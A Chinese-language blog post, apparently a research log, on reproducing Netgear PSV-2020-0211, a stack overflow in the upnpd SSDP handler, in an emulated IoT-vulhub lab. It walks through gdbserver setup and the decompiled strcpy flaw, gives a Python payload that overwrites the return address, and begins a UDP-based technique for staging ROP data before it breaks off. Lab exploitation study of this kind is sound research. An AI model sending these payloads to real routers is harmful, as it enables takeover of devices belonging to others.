---
title:  "Netgear"
mathjax: true
layout: post
---

今天开始，我们调试一些IOT设备的漏洞。

对于IOT设备的漏洞而言，最难的部分不是漏洞本身，而是漏洞环境的搭建。
所以当我在搜索的时候，找到了[这样的一个项目](https://github.com/firmianay/IoT-vulhub)
这个项目非常的有意思，提供了一些漏洞的环境搭建方法和基本工具的Dockerfile。

通过这个项目能够搭建出漏洞调试环境。

# Install
首先在baseImage当中提供了对应工具的Dockerfile，
可以自己build对应的Dockerfile上传到自己的账号上

# Netgear
这次要调试的是Netgear的`PSV-2020-0211`漏洞。
直接cd到对应的目录当中就能够找到对应的`docker-compose.yml`文件。不过它这个yml文件需要修改一下，因为作者自己的docker是没有对公众开放的。
这里用到的`FROM firmianay/qemu-system:armhf`是不能直接pull下来的。
所以要自己在baseImage文件夹下面一个个build一下，
从ubuntu16.04开始build。

需要注意的是在qemu-system构建的过程中首先要下载好qemu的镜像文件，
image文件夹下有download.sh脚本，里面的三个文件需要全部下载下来。

接下来就直接build，并启动环境了。
```
docker-compose -f docker-compose-system.yml build
docker-compose -f docker-compose-system.yml up
```
然后你可以在当中看到启动的log
![图片.png](https://i.loli.net/2021/02/07/UiS4IyDvRqFWf5Y.png)

开启另一个终端获得一个bash
```
docker exec -it netgear-system /bin/bash
```

## Debug
启动了之后会在qemu启动的armhf主机上开启5000端口
，同时会开启udp的1900端口。
![image.png](https://i.loli.net/2021/02/08/dDRtslipCja5zMN.png)

通过gdb挂载进程进行调试，首先自己交叉编译一个armhf版本的gdb出来，或者上网找一个[别人编译好的版本](https://github.com/stayliv3/gdb-static-cross/blob/master/prebuilt/gdbserver-7.7.1-armhf-eabi5-v1-sysv)。

根据IOT-vulnhub中的文档，将所需要的工具放到`system-emu/tools/`文件夹当中，就能在`squashfs-root/tools`当中看到。  
所以将下载后的gdbserver放进去。

进入到squashfs-root文件夹下面，启动`/bin/sh`程序
```
root@debian-armhf:~/squashfs-root# chroot . /bin/sh


BusyBox v1.7.2 (2018-12-13 12:34:27 CST) built-in shell (ash)
Enter 'help' for a list of built-in commands.

# 
```
用gdb-server，attach到进程上
```
# ./gdbserver-7.7.1-armhf-eabi5-v1-sysv --attach :1234 $(ps | grep upnpd | grep -v grep | awk '{print $1}')
Attached; pid = 2473
Listening on port 1234
```
debian-armhf当中调用gdb attach上去
```
gdb-multiarch
set architecture arm
target remote 192.168.2.2:1234
layout regs
```
因为使用gef的时候出现了各种各样的问题，即使用了`gef-remote`命令还是有问题。最后选择了原生的gdb进行调试，有一点不适应的地方就是不能上下键切换历史命令了。

将程序拖入ida当中

找到漏洞函数`sub_1D020()`，发现在这个位置调用了`recvfrom`函数，从socket当中获取0x1fff字节长度的数据。  
随后又进入到`sub_25E04()`函数中执行。
![image.png](https://i.loli.net/2021/02/08/j3i8QHWuzh1e64G.png)
在`sub_25E04()`函数中直接调用了strcpy，把原本最大长度是0x1fff字节的数据复制到了栈上的v39里面，造成了栈溢出。  
v39离bp只有0x634字节的距离，所以后面可以直接覆盖掉bp和ret地址

对于作者提供的poc，需要修改其中的v41指针指向一个合法内存，否则在strcpy之后。
```
  char v39[12]; // [sp+24h] [bp-634h] BYREF
  int s[10]; // [sp+600h] [bp-58h] BYREF
  char *v41; // [sp+628h] [bp-30h] BYREF
  __int16 v42; // [sp+62Ch] [bp-2Ch] BYREF

  v42 = ' ';
  srpintf(3, "%s(%d):\n", "ssdp_http_method_check", 203);
  if ( dword_93AE0 == 1 )
    return 0;
  v41 = v39;
  strcpy(v39, a1);
  v7 = find_str((const char **)&v41, (const char *)&v42);
  v8 = v7;
  if ( !v7 )
```
使用v41指针时会由于指向非法内存挂掉。

在gdb当中`info proc mappings`拿到libc的地址就行。替换掉poc.py当中的payload
```
payload = (
    0x604 * b'a' +  # dummy
    p32(0x76da9010) +  # v41
    (0x634 - 0x604 - 8) * b'a' +  # dummy
    p32(0x43434343)  # LR
)
```
即可控制PC。

## Exploit
因为出现问题的是strcpy函数，所以像`\x00`这种字节是没办法输入的，否则就直接截断了。

对于这种问题，可以将ROP提前布置到内存环境中，在构造输入时，在payload前面加上`\x00`截断。
```
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect(('192.168.2.2', 1900))
s.send(b'\x00' + b'A' * 0x1ff0)
s.send(b'\x00' + b'B' * 0x633)
s.close()
```
由于是调用的recvfrom从socket中读取的数据，这样执行了之后，会将读取的数据存入内存当中。  
之后如果这段内存没有初始化的话，后面第二次recv的时候，这块内存还会存在。

对于上面的payload，我们在gdb当中进行调试，首先在strcpy的地方下一个断点。  
然后看看两次send之后内存当中的数据情况。






